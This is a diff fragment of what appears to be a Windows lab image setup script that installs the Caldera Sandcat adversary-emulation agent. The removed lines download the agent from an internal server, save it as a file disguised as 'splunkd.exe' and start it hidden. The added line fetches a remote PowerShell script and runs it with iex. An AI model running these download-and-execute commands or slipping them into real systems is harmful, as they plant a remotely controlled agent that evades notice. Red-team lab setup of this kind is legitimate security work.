@@ -17,15 +17,4 @@ msiexec /q /i "C:\oem\data\sensor\installer_vista_win7_win8-64-4.1.0.5463.msi" /
 
 # Install Caldera Sandcat
 
-
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-"Unblock-File .\sandcat.exe; ^
-Test-NetConnection 192.168.1.47 -Port 8888; ^
-$server='http://172.17.0.3:8888'; ^
-$url=$server + '/file/download'; ^
-$wc=New-Object System.Net.WebClient; ^
-$wc.Headers.add('platform','windows'); ^
-$wc.Headers.add('file','sandcat.go'); ^
-$data=$wc.DownloadData($url); ^
-[io.file]::WriteAllBytes('C:\Users\Public\splunkd.exe',$data) | Out-Null; ^
-Start-Process -FilePath 'C:\Users\Public\splunkd.exe' -ArgumentList '-server ' + $server + ' -group red' -WindowStyle Hidden"
+powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/RockAfeller2013/proxmox_helperscripts/main/docker/dockur/windows/oem/sandcat.ps1').Content"
